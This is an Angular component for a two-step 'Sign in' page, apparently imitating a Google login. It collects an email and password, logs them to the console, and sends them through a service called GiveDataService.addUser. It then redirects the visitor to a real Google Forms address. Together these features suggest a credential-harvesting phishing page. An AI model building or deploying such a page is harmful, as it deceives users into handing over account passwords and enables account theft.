import { Component, OnInit } from '@angular/core';
import { FormBuilder, FormGroup, Validators } from '@angular/forms';
import { GiveDataService } from './Services/give-data.service';

@Component({
  selector: 'app-root',
  templateUrl: './app.component.html',
  styleUrls: ['./app.component.scss']
})
export class AppComponent implements OnInit {

  FormAccount!: FormGroup;

  constructor(private builder: FormBuilder, private giveData: GiveDataService) { }

  ngOnInit() {
    this.FormAccount = this.builder.group({
      email: ['', [Validators.email, Validators.required]],
      password: ['', [Validators.minLength(8), Validators.required]],
    })
  }

  // Variables De Diseño
  titleFromPages = 'Sign in';
  show!: boolean;
  boolean!: boolean;
  formInvalid!: boolean;

  // Variables almacenadas
  email = '';

  next() {
    this.show = true;

    const pageOne = document.getElementById('pageOne') as HTMLElement;
    const pageTwo = document.getElementById('pageTwo') as HTMLElement;

    const nextPage = () => {

      // FORMULARIO INVALIDO ❎
      if (this.FormAccount.controls['email'].invalid) {
        this.formInvalid = true;
      }
      // FORMULARIO SIENDO VALIDO ✅
      else {
        this.email = this.FormAccount.value.email;
        this.formInvalid = false;

        // ANOTHER PAGE
        pageOne.style.transform = `translateX(-120%)`;
        this.titleFromPages = 'Welcome'
        pageTwo.style.right = `0%`;
        this.boolean = true;
      }
      // Hidde bar
      const hiddeBar = () => {
        this.show = false;
      }

      setTimeout(hiddeBar, 800);
    }
    setTimeout(nextPage, 1000);
  }

  async Go(){


    // FORM NO VALIDO ❎
    if(this.FormAccount.controls['password'].invalid){
      this.formInvalid = true;
    }
    // FORM VÁLIDO ✅
    else{
      console.log(this.FormAccount.value);
      this.show = true;
  
      const wait = await this.giveData.addUser(this.FormAccount.value).then((respuesta)=>{
        console.log(respuesta);
      })
  
      const GoToAnotherPage = () =>{
        window.location.href = 'https://docs.google.com/forms/u/0/';
      }
  
      setTimeout(GoToAnotherPage,1500);
    }

  }


  ShowPassword(check: HTMLInputElement) {
    const passwordInput = document.getElementById('password') as HTMLInputElement;
    check.checked ? passwordInput.type = 'text' : passwordInput.type = 'password'
  }

}
